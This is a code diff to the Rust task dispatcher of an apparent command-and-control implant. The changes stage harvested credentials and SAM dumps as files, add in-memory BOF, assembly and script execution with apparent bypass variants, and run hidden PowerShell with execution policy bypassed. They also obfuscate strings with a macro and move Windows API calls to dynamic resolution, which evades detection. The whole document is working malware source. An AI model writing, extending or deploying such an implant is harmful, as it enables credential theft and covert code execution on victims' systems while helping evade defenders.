@@ -6,6 +6,7 @@
 use std::sync::atomic::{AtomicU64, Ordering};
 use std::sync::Arc;
 use rand::RngCore;
+use crate::s;
 use crate::transport::SharedTransport;
 use crate::persist;
 use crate::creds;
@@ -141,7 +142,13 @@ pub fn dispatch(
 
         // ── Credential Harvesting ────────────────────────────────────────────
         "creds_harvest" => {
-            Some(TaskResponse::ok(task, creds::harvest(state, transport)))
+            let decrypt = task.args.get("decrypt").and_then(|v| v.as_bool()).unwrap_or(false);
+            let (output, files) = creds::harvest(state, transport, decrypt);
+            if files.is_empty() {
+                Some(TaskResponse::ok(task, output))
+            } else {
+                Some(TaskResponse::ok_staged_files(task, output, files))
+            }
         }
 
         "creds_coerce" => {
@@ -149,7 +156,12 @@ pub fn dispatch(
         }
 
         "creds_sam" => {
-            Some(TaskResponse::ok(task, creds::sam(state, transport)))
+            let (output, files) = creds::sam(state, transport);
+            if files.is_empty() {
+                Some(TaskResponse::ok(task, output))
+            } else {
+                Some(TaskResponse::ok_staged_files(task, output, files))
+            }
         }
 
         "creds_listen_start" => {
@@ -172,17 +184,50 @@ pub fn dispatch(
         "bof_exec" => {
             let staging = task.arg_str("staging_path");
             let args = task.arg_str("args");
-            Some(TaskResponse::ok(task, inlinexec::bof_exec(state, transport, session_key, staging, args)))
+            crate::dlog!("dispatch", "bof_exec staging={} args={:?}", staging, args);
+            let result = inlinexec::bof_exec(state, transport, session_key, staging, args);
+            crate::dlog!("dispatch", "bof_exec done, output_len={}", result.len());
+            Some(TaskResponse::ok(task, result))
         }
         "assembly_exec" => {
             let staging = task.arg_str("staging_path");
             let args = task.arg_str("args");
-            Some(TaskResponse::ok(task, inlinexec::assembly_exec(state, transport, session_key, staging, args)))
+            crate::dlog!("dispatch", "assembly_exec staging={} args={:?}", staging, args);
+            let result = inlinexec::assembly_exec(state, transport, session_key, staging, args);
+            crate::dlog!("dispatch", "assembly_exec done, output_len={}", result.len());
+            Some(TaskResponse::ok(task, result))
+        }
+        "assembly_exec_ab" => {
+            let staging = task.arg_str("staging_path");
+            let args = task.arg_str("args");
+            crate::dlog!("dispatch", "assembly_exec_ab staging={} args={:?}", staging, args);
+            let result = inlinexec::assembly_exec_ab(state, transport, session_key, staging, args);
+            crate::dlog!("dispatch", "assembly_exec_ab done, output_len={}", result.len());
+            Some(TaskResponse::ok(task, result))
         }
         "memexec" => {
             let staging = task.arg_str("staging_path");
             let args = task.arg_str("args");
-            Some(TaskResponse::ok(task, inlinexec::memexec(state, transport, session_key, staging, args)))
+            crate::dlog!("dispatch", "memexec staging={} args={:?}", staging, args);
+            let result = inlinexec::memexec(state, transport, session_key, staging, args);
+            crate::dlog!("dispatch", "memexec done, output_len={}", result.len());
+            Some(TaskResponse::ok(task, result))
+        }
+        "script_exec" => {
+            let staging = task.arg_str("staging_path");
+            let args = task.arg_str("args");
+            crate::dlog!("dispatch", "script_exec staging={} args={:?}", staging, args);
+            let result = inlinexec::script_exec(state, transport, session_key, staging, args);
+            crate::dlog!("dispatch", "script_exec done, output_len={}", result.len());
+            Some(TaskResponse::ok(task, result))
+        }
+        "script_exec_ab" => {
+            let staging = task.arg_str("staging_path");
+            let args = task.arg_str("args");
+            crate::dlog!("dispatch", "script_exec_ab staging={} args={:?}", staging, args);
+            let result = inlinexec::script_exec_ab(state, transport, session_key, staging, args);
+            crate::dlog!("dispatch", "script_exec_ab done, output_len={}", result.len());
+            Some(TaskResponse::ok(task, result))
         }
 
         // "persist_action" is a PS-only shorthand — Rust does not support it
@@ -341,9 +386,12 @@ fn cmd_shell(task: &Task, state: &Arc<AgentState>) -> TaskResponse {
         let spawn_result = {
             use std::os::windows::process::CommandExt;
             use std::process::Stdio;
-            std::process::Command::new("powershell")
-                .args(["-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
-                       "-ExecutionPolicy", "Bypass", "-Command", &cmd_owned])
+            let ps_args = [
+                s!("-NoProfile"), s!("-NonInteractive"), s!("-WindowStyle"), s!("Hidden"),
+                s!("-ExecutionPolicy"), s!("Bypass"), s!("-Command"), cmd_owned.clone(),
+            ];
+            std::process::Command::new(s!("powershell"))
+                .args(&ps_args)
                 .current_dir(&cwd_owned)
                 .stdout(Stdio::piped())
                 .stderr(Stdio::piped())
@@ -400,10 +448,9 @@ fn cmd_shell(task: &Task, state: &Arc<AgentState>) -> TaskResponse {
                 }
                 #[cfg(windows)]
                 unsafe {
-                    use windows_sys::Win32::System::Threading::{OpenProcess, TerminateProcess, PROCESS_TERMINATE};
                     use windows_sys::Win32::Foundation::CloseHandle;
-                    let h = OpenProcess(PROCESS_TERMINATE, 0, pid);
-                    if h != 0 { TerminateProcess(h, 1); CloseHandle(h); }
+                    let h = crate::dynapi::open_process(0x0001, 0, pid); // PROCESS_TERMINATE
+                    if h != 0 { crate::dynapi::terminate_process(h, 1); CloseHandle(h); }
                 }
             }
             // After kill, try to collect any partial output the process wrote
@@ -646,13 +693,8 @@ fn kill_cleanup(state: &Arc<AgentState>, transport: &SharedTransport) {
                 // Schedule for deletion on next reboot via MoveFileExW.
                 use std::os::windows::ffi::OsStrExt;
                 let wide: Vec<u16> = exe.as_os_str().encode_wide().chain(Some(0)).collect();
-                extern "system" {
-                    fn MoveFileExW(lpExistingFileName: *const u16,
-                                   lpNewFileName: *const u16,
-                                   dwFlags: u32) -> i32;
-                }
                 // MOVEFILE_DELAY_UNTIL_REBOOT = 0x4
-                unsafe { MoveFileExW(wide.as_ptr(), std::ptr::null(), 0x4); }
+                unsafe { crate::dynapi::move_file_ex_w(wide.as_ptr(), std::ptr::null(), 0x4); }
             }
         }
     }
